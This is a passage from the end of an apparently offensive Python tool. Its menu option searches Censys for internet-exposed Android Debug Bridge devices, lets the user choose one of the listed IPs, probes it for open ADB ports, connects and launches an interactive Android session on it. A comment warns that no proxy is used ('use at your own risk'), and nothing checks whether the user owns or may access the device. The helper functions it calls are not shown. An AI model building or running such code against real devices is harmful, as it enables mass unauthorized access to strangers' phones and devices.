                    print_warning("Cannot interact with unknown device type.")
            except:
                print_error("Invalid selection.")

        # ----- Option 3: Censys search using Personal Access Token -----
        elif choice == "3":
            if not CENSYS_AVAILABLE:
                print_error("Censys SDK not installed. Install with: pip install censys")
                continue
            censys_devices = censys_search_adb_devices()
            if not censys_devices:
                print_warning("No devices found via Censys (or API error).")
                continue
            print_info("\nCensys results:")
            for idx, (ip, data) in enumerate(censys_devices, 1):
                location = data.get('location', {})
                country = location.get('country', 'Unknown')
                print(f"{idx}. {ip} (country: {country})")
            try:
                sel = int(input("Select device to attempt connection (0 to skip): ")) - 1
                if sel < 0:
                    continue
                ip, _ = censys_devices[sel]
                print_info(f"Attempting to connect to {ip}...")
                # Try all ADB ports directly (no proxy used for Censys IPs – use at your own risk)
                adb_port = find_open_adb_port(ip, None, None)
                if adb_port:
                    serial = connect_device(ip, adb_port)
                    if serial:
                        run_android_session(serial, None, None)
                else:
                    print_error(f"No open ADB port found on {ip}")
            except:
                print_error("Invalid selection.")

        else:
            print_error("Invalid choice. Please enter 1, 2, 3, or 0.")

if __name__ == "__main__":
    main()